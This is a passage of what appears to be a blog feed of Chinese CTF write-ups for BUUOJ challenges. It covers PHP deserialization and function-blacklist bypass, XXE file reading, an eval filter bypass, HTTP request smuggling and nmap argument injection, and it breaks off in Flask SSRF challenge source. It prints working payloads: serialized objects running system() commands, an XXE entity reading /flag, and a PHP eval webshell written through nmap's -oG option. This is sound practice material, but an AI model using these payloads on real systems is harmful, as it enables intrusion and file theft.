class="string">&quot;popen&quot;</span>,<span class="string">&quot;dl&quot;</span>,<span class="string">&quot;eval&quot;</span>,<span class="string">&quot;proc_terminate&quot;</span>,<span class="string">&quot;touch&quot;</span>,<span class="string">&quot;escapeshellcmd&quot;</span>,<span class="string">&quot;escapeshellarg&quot;</span>,<span class="string">&quot;assert&quot;</span>,<span class="string">&quot;substr_replace&quot;</span>,<span class="string">&quot;call_user_func_array&quot;</span>,<span class="string">&quot;call_user_func&quot;</span>,<span class="string">&quot;array_filter&quot;</span>, <span class="string">&quot;array_walk&quot;</span>,  <span class="string">&quot;array_map&quot;</span>,<span class="string">&quot;registregister_shutdown_function&quot;</span>,<span class="string">&quot;register_tick_function&quot;</span>,<span class="string">&quot;filter_var&quot;</span>, <span class="string">&quot;filter_var_array&quot;</span>, <span class="string">&quot;uasort&quot;</span>, <span class="string">&quot;uksort&quot;</span>, <span class="string">&quot;array_reduce&quot;</span>,<span class="string">&quot;array_walk&quot;</span>, <span class="string">&quot;array_walk_recursive&quot;</span>,<span class="string">&quot;pcntl_exec&quot;</span>,<span class="string">&quot;fopen&quot;</span>,<span class="string">&quot;fwrite&quot;</span>,<span class="string">&quot;file_put_contents&quot;</span>);</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">gettime</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$p</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$result</span> = <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$func</span>, <span class="variable">$p</span>);</span><br><span class="line">        <span class="variable">$a</span>= <span class="title function_ invoke__">gettype</span>(<span class="variable">$result</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$a</span> == <span class="string">&quot;string&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;<span class="keyword">return</span> <span class="string">&quot;&quot;</span>;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$p</span> = <span class="string">&quot;Y-m-d h:i:s a&quot;</span>;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$func</span> = <span class="string">&quot;date&quot;</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;func != <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="title function_ invoke__">gettime</span>(<span class="variable">$this</span>-&gt;func, <span class="variable">$this</span>-&gt;p);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$func</span> = <span class="variable">$_REQUEST</span>[<span class="string">&quot;func&quot;</span>];</span><br><span class="line">    <span class="variable">$p</span> = <span class="variable">$_REQUEST</span>[<span class="string">&quot;p&quot;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$func</span> != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="variable">$func</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$func</span>);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$func</span>,<span class="variable">$disable_fun</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">gettime</span>(<span class="variable">$func</span>, <span class="variable">$p</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Hacker...&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line">&lt;/p&gt;</span><br><span class="line">&lt;form  id=form1 name=form1 action=<span class="string">&quot;index.php&quot;</span> method=post&gt;</span><br><span class="line">    &lt;input type=hidden id=func name=func value=<span class="string">&#x27;date&#x27;</span>&gt;</span><br><span class="line">    &lt;input type=hidden id=p name=p value=<span class="string">&#x27;Y-m-d h:i:s a&#x27;</span>&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>第一想到的就是反序列化了</p><p>这里并没有过滤serialize()函数,就可以造成反序列化,从而绕过disable_fun的检查</p><p>exp:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$p</span>;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$func</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$nacl</span> = <span class="keyword">new</span> <span class="title class_">Test</span>;</span><br><span class="line">    <span class="variable">$nacl</span>-&gt;func = <span class="string">&#x27;system&#x27;</span>;</span><br><span class="line">    <span class="variable">$nacl</span>-&gt;p = <span class="string">&#x27;cat /tmp/flagoefiu4r93&#x27;</span>;</span><br><span class="line">    <span class="comment">//find / -name *flag*&quot;;s:4:&quot;func&quot;;s:6:&quot;system</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$nacl</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>查找flag:</p><p>func&#x3D;unserialize&amp;p&#x3D;O:4:”Test”:2:{s:1:”p”;s:19:”find &#x2F; -name <em>flag</em>“;s:4:”func”;s:6:”system”;}</p><p>最终payload:</p><p>func&#x3D;unserialize&amp;p&#x3D;O:4:”Test”:2:{s:1:”p”;s:22:”cat &#x2F;tmp&#x2F;flagoefiu4r93”;s:4:”func”;s:6:”system”;}</p><p>得到flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;p&gt;</span><br><span class="line">    flag&#123;92146d45-0e57-40cc-a59b-8fd5c52bc35d&#125;</span><br><span class="line">flag&#123;92146d45-0e57-40cc-a59b-8fd5c52bc35d&#125;&lt;/p&gt;</span><br></pre></td></tr></table></figure><p>还有一种方法是用<code>\system</code>绕过inarry的过滤</p><p>payload:</p><p>func&#x3D;\system&amp;p&#x3D;cat &#x2F;tmp&#x2F;flagoefiu4r93</p>]]></content>
      
      
      <categories>
          
          <category> buu刷题记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>从一道题目中了解XXE漏洞</title>
      <link href="/2024/01/13/%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E7%9B%AE%E4%B8%AD%E4%BA%86%E8%A7%A3XXE%E6%BC%8F%E6%B4%9E/"/>
      <url>/2024/01/13/%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E7%9B%AE%E4%B8%AD%E4%BA%86%E8%A7%A3XXE%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="NCTF2019-Fake-XML-cookbook"><a href="#NCTF2019-Fake-XML-cookbook" class="headerlink" title="[NCTF2019]Fake XML cookbook"></a>[NCTF2019]Fake XML cookbook</h1><p>关于XXE漏洞参考:</p><p><a href="https://xz.aliyun.com/t/6887?time__1311=n4+xnD0DRDyB5AKDsYohhG5it0=7KqYqx">从XML相关一步一步到XXE漏洞</a></p><p>可以看见,这里回显了<code>&lt;uesrname&gt;&lt;/username&gt;</code>标签中的内容</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240114165435806.png" alt="image-20240114165435806"></p><p>故而构造payload,将这个位置输出改为任意文件读取</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/doLogin.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>76b8b4e7-f8b0-4c91-a92c-caaf7c02d684.node5.buuoj.cn:81</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>application/xml, text/xml, */*; q=0.01</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/xml;charset=utf-8</span><br><span class="line"><span class="attribute">X-Requested-With</span><span class="punctuation">: </span>XMLHttpRequest</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>166</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://76b8b4e7-f8b0-4c91-a92c-caaf7c02d684.node5.buuoj.cn:81</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://76b8b4e7-f8b0-4c91-a92c-caaf7c02d684.node5.buuoj.cn:81/</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span> ?&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="meta">&lt;!DOCTYPE <span class="keyword">nacl</span> [</span></span></span><br><span class="line"><span class="meta"><span class="language-xml"><span class="meta">&lt;!ENTITY <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///flag&quot;</span>&gt;</span></span></span></span><br><span class="line"><span class="meta"><span class="language-xml">]&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;file;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>nacl<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>得到flag:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>openresty</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Sun, 14 Jan 2024 08:52:55 GMT</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html; charset=utf-8</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>85</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Vary</span><span class="punctuation">: </span>Accept-Encoding</span><br><span class="line"><span class="attribute">X-Powered-By</span><span class="punctuation">: </span>PHP/7.4.0RC6</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>no-cache</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="section">&lt;result&gt;</span><span class="section">&lt;code&gt;</span><span class="attribute">0</span>&lt;/code&gt;&lt;msg&gt;flag&#123;f6f20d58-f890-<span class="number">498</span>d-<span class="number">9938</span>-<span class="number">465594</span>f59376&#125;</span></span><br><span class="line"><span class="language-apache"><span class="section">&lt;/msg&gt;</span><span class="section">&lt;/result&gt;</span></span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> XXE漏洞(XML外部实体注入) </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XXE漏洞(XML外部实体注入) </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>从一个题目中了解http请求走私</title>
      <link href="/2024/01/13/%E4%BB%8E%E4%B8%80%E4%B8%AA%E9%A2%98%E7%9B%AE%E4%B8%AD%E4%BA%86%E8%A7%A3http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/"/>
      <url>/2024/01/13/%E4%BB%8E%E4%B8%80%E4%B8%AA%E9%A2%98%E7%9B%AE%E4%B8%AD%E4%BA%86%E8%A7%A3http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/</url>
      
        <content type="html"><![CDATA[<h1 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="RoarCTF 2019]Easy Calc"></a>RoarCTF 2019]Easy Calc</h1><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p>之前做过这道题,但是是使用php字符串解析来绕过</p><p>关于php字符串解析特性:</p><p><a href="https://www.freebuf.com/articles/web/213359.html">利用PHP的字符串解析特性Bypass</a></p><p>并且还做了一些过滤黑字符,比如<code>/</code>和反引号等等</p><p>源码&#x2F;calc.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">        <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>,<span class="string">&#x27;\$&#x27;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;\^&#x27;</span>];</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$str</span>)) &#123;</span><br><span class="line">                        <span class="keyword">die</span>(<span class="string">&quot;what are you want to do?&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$str</span>.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>不过还是可以绕过</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/calc.php?%20num=var_dump(scandir(chr(47)))</span><br><span class="line">/calc.php?%20num=file_get_contents(chr(47).f1agg) </span><br></pre></td></tr></table></figure><p>chr将ascii码转换为字符</p><h3 id="方法二-http请求走私"><a href="#方法二-http请求走私" class="headerlink" title="方法二:http请求走私"></a>方法二:http请求走私</h3><p>这篇文章写的非常详细:</p><p><a href="https://xz.aliyun.com/t/6654?time__1311=n4+xnD0DRDBGitGk7rDsA3o+DcC+CN3DuiAYD">从一道题到协议层攻击之HTTP请求走私</a></p><p>使用CL-CL的方式使得前端服务器</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240113201605455.png" alt="image-20240113201605455"></p><p>按照<strong>RFC7230规范</strong>,此时应该返回400错误,前端服务器也确实做了,但是仍然将请求转发给了后端,使得前端服务器的waf被绕过</p>]]></content>
      
      
      <categories>
          
          <category> buu刷题记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> http请求走私 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网鼎杯 2020 朱雀组 Nmap</title>
      <link href="/2024/01/09/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E6%9C%B1%E9%9B%80%E7%BB%84-Nmap/"/>
      <url>/2024/01/09/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E6%9C%B1%E9%9B%80%E7%BB%84-Nmap/</url>
      
        <content type="html"><![CDATA[<h1 id="网鼎杯-2020-朱雀组-Nmap"><a href="#网鼎杯-2020-朱雀组-Nmap" class="headerlink" title="[网鼎杯 2020 朱雀组]Nmap"></a>[网鼎杯 2020 朱雀组]Nmap</h1><p>一个在线nmap工具,第一反应应该是<code>;</code> <code>||</code> <code>&amp;&amp;</code>拼接其他命令</p><p>无果.</p><p>那么就可以猜测nmap是否有一些特殊的参数可以利用了</p><p>查询nmap中文文档,发现有可以输出内容到文件的参数:<a href="https://nmap.org/man/zh/man-output.html">https://nmap.org/man/zh/man-output.html</a></p><p>可以手动测试一下</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240112200133393.png" alt="image-20240112200133393"></p><p>这会把一个php一句话木马保存到文件中,并且后缀名是可以被我们自定义为.php的</p><p>但是这里是加了waf的,不过很容易能够测试出来是过滤了’php’</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240112200505004.png" alt="image-20240112200505004"></p><p>这里使用php短标签绕过就行</p><p>payload: </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?= @eval($_POST[nacl]);?&gt;&#x27; -oG shell.phtml &#x27;</span><br></pre></td></tr></table></figure><p>直接在网站根目录就能访问到木马</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240112210140474.png" alt="image-20240112210140474"></p><p>但是这里的敏感字符被转译了,百般搜索后发现是采用了<a href="https://paper.seebug.org/164/">escapeshellarg()+escapeshellcmd()</a></p><p>这下不得不换一个别人的思路了</p><p>这里网上的wp采用另一个参数<code>iL</code>来读取&#x2F;flag下的内容</p><p>paylaod:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">host=127.0.0.1&#x27; -iL /flag -oN flag.txt &#x27;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240112210950828.png" alt="image-20240112210950828"></p><p>这里添加的<code>&#39;</code>用来绕过escapeshellarg()+escapeshellcmd()</p><p>关于<code>escapeshellarg()+escapeshellcmd()</code>可以参考: </p><p><a href="https://paper.seebug.org/164/">PHP escapeshellarg()+escapeshellcmd() 之殇</a></p><p>大概意思:</p><blockquote><p>escapeshellarg():</p><p>对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。</p><p>escapeshellcmd():</p><p>反斜线（\）会在以下字符之前插入：<code>&amp;#;</code>|*?~&lt;&gt;^()[]{}$`、<code>\x0A</code> 和 <code>\xFF</code>。 <code>&#39;</code> 和 <code>&quot;</code> 仅在不配对儿的时候被转义。在 Windows 平台上，所有这些字符以及 <code>%</code> 和 <code>!</code> 字符前面都有一个插入符号（<code>^</code>）。</p></blockquote><p>两者加在一起使用就会产生能bypass的地方</p><p>测试:</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240113192401065.png" alt="image-20240113192401065"></p><p>即escapeshellarg()添加的’<code>\</code>被escapeshellcmd()使用<code>\</code>转义,后面的引号也就逃逸了</p><p>直接访问得到flag,这是由于<code>-iL</code>在扫描到非主机名时会报错而把内容显示出来</p><p>不过此方法并不够完美,因为我们无法提前得知flag的位置…</p>]]></content>
      
      
      <categories>
          
          <category> buu刷题记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP escapeshellarg()+escapeshellcmd() 之殇 </tag>
            
            <tag> nmap参数注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>De1CTF 2019 SSRF Me</title>
      <link href="/2024/01/08/De1CTF-2019-SSRF-Me/"/>
      <url>/2024/01/08/De1CTF-2019-SSRF-Me/</url>
      
        <content type="html"><![CDATA[<p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240108185428742.png" alt="image-20240108185428742"></p><p>没有缩进的python</p><p>尝试还原 or 上网找师傅的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment"># #encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">&#x27;latin1&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">app = Flask(__name__)</span><br><span class="line"> </span><br><span class="line">secert_key = os.urandom(<span class="number">16</span>)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Task</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, action, param, sign, ip</span>):        <span class="comment">#初始赋值</span></span><br><span class="line">        self.action = action</span><br><span class="line">        self.param = param</span><br><span class="line">        self.sign = sign</span><br><span class="line">        self.sandbox = md5(ip)</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">not</span> os.path.exists(self.sandbox)):       </span><br><span class="line">            os.mkdir(self.sandbox)</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">Exec</span>(<span class="params">self</span>):</span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">        <span class="keyword">if</span> (self.checkSign()): <span class="comment">#52</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;scan&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                tmpfile = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;w&#x27;</span>)   <span class="comment">#以写的形式打开result.txt</span></span><br><span class="line">                resp = scan(self.param)<span class="comment">#79</span></span><br><span class="line">                <span class="keyword">if</span> (resp == <span class="string">&quot;Connection Timeout&quot;</span>):</span><br><span class="line">                    result[<span class="string">&#x27;data&#x27;</span>] = resp</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span> (resp)<span class="comment">#################这并不会在网页中打印resp的值</span></span><br><span class="line">                    tmpfile.write(resp)    <span class="comment">#将resp中的数据写入result.txt中</span></span><br><span class="line">                    tmpfile.close()</span><br><span class="line">                result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;read&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                f = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;r&#x27;</span>)    <span class="comment">#打开方式为只读</span></span><br><span class="line">                result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">                result[<span class="string">&#x27;data&#x27;</span>] = f.read()    <span class="comment">#读取result.txt中的数据</span></span><br><span class="line">            <span class="keyword">if</span> result[<span class="string">&#x27;code&#x27;</span>] == <span class="number">500</span>:</span><br><span class="line">                result[<span class="string">&#x27;data&#x27;</span>] = <span class="string">&quot;Action Error&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">            result[<span class="string">&#x27;msg&#x27;</span>] = <span class="string">&quot;Sign Error&quot;</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">checkSign</span>(<span class="params">self</span>): <span class="comment">#30</span></span><br><span class="line">        <span class="keyword">if</span> (getSign(self.action, self.param) == self.sign): <span class="comment">#86</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/geneSign&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">geneSign</span>():</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    action = <span class="string">&quot;scan&quot;</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br><span class="line"> </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/De1ta&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)     </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge</span>():</span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">&quot;action&quot;</span>))        <span class="comment">#cookie传递action参数，对应不同的处理方式</span></span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))        <span class="comment">#传递get方式的参数param</span></span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">&quot;sign&quot;</span>))            <span class="comment">#cookie传递sign参数sign</span></span><br><span class="line">    ip = request.remote_addr                <span 